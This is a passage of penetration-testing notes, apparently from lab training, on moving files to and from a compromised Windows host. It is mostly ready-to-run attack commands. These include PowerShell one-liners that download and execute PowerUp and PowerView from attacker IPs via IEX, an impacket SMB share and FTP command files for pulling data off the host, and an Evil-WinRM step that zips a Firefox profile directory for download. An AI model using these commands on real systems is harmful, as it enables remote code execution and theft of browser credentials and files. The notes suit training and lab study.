##### PowerShell Invoke-WebRequest
```
Invoke-WebRequest http://10.10.14.140:8088/PowerUp.ps1 -OutFile PowerUp.ps1
```
If error appears, use:
```
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

#### SMB Downloads
```
impacket-smbserver share -smb2support /tmp -username test -password test
```
Then mount the share on the compromised host.
```
net use n: \\10.10.15.6\share /user:test test
```
And move file.
```
move test.txt n:\
```

#### FTP Downloads
Installing the FTP server
```
sudo pip3 install pyftpdlib
```
Setting up the FTP server
```
sudo python3 -m pyftpdlib --port 21
```
After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.
```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt C:\htb> echo USER anonymous >> ftpcommand.txt C:\htb> echo binary >> ftpcommand.txt C:\htb> echo GET file.txt >> ftpcommand.txt C:\htb> echo bye >> ftpcommand.txt C:\htb> ftp -v -n -s:ftpcommand.txt ftp> open 192.168.49.128 Log in with USER and PASS first. ftp> USER anonymous ftp> GET file.txt ftp> bye C:\htb>more file.txt This is a test file
```


#### Evil-WinRM
If we have WinRM access evil-winrm allow us to download files with the simple "download" command. 
For instance if you want to download a full directory with a bunch of files just compress the files into a zip file, then download this.

```
Compress-Archive -Path br53rxeg.default-release -Destination 1.zip
```
In this case we are on the same directory in which br53rxeg.default-release is located.


